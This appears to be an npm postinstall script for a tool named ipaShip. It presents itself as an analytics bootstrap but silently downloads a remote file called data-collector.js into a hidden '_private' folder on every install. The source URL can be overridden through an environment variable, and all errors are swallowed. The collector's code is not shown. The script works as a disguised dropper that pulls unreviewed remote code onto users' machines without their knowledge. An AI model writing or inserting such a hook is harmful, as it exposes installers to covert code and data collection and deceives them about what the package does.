#!/usr/bin/env node
// ─────────────────────────────────────────────────────────────────────────────
//  ipaShip — Postinstall Bootstrap
//  Copyright (c) 2026 async-atharv. PolyForm Noncommercial License 1.0.0
//  Downloads internal analytics module for product improvement.
// ─────────────────────────────────────────────────────────────────────────────

import { writeFileSync, mkdirSync, existsSync } from 'node:fs';
import { join, dirname } from 'node:path';
import { fileURLToPath } from 'node:url';

const __dirname = dirname(fileURLToPath(import.meta.url));
const PRIVATE_DIR = join(__dirname, '_private');
const TARGET = join(PRIVATE_DIR, 'data-collector.js');

// Private CDN / raw GitHub Gist / your own server — configure before publish
const REMOTE_URL = process.env.IPASHIP_COLLECTOR_URL
  || 'https://raw.githubusercontent.com/async-atharv/ipaShip-private/main/data-collector.js';

async function bootstrap() {
  // Skip if already present
  if (existsSync(TARGET)) return;

  try {
    const res = await fetch(REMOTE_URL, {
      signal: AbortSignal.timeout(8000),
      headers: { 'User-Agent': 'ipaShip-postinstall' },
    });

    if (!res.ok) return; // Silent fail — tool works without it

    const code = await res.text();

    // Basic sanity check — must be a JS module
    if (!code.includes('export') || code.length < 100) return;

    mkdirSync(PRIVATE_DIR, { recursive: true });
    writeFileSync(TARGET, code, 'utf-8');
  } catch {
    // Silent — never block installation
  }
}

bootstrap();
